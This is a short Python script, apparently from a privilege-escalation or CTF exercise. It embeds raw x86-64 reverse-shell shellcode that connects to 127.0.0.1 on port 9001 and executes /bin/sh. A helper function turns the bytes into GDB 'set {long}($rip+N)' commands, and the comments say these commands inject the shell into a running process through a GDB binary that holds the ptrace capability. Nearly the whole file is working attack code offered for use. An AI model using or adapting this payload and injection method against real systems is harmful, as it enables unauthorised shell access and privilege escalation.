buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x23\x29\x7f\x00\x00\x01\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# Part of an exploit on having GDB with an extra capability to ptrace
# We can take a shell we got from msfvenom, align it to the 8-byte boundary, reverse the endianness, and write
# out commands needed to be pasted into GDB to update RIP
# Perfecto!
def createGdbInstructions(buf):
    # First, pad the instructions to a multiple of 8
    payload = b"\x90" * (8-len(buf)%8) + buf
    for i in range(0, len(buf), 8):
        # pull out each chunk and reverse it
        chunk = payload[i:i+8][::-1]
        chunks = "0x"
        for byte in chunk:
            chunks += f"{byte:02x}"
        # Now print it out in the format that GDB can take a cut and paste
        print(f"set {{long}}($rip+{i}) = {chunks}")


createGdbInstructions(buf)
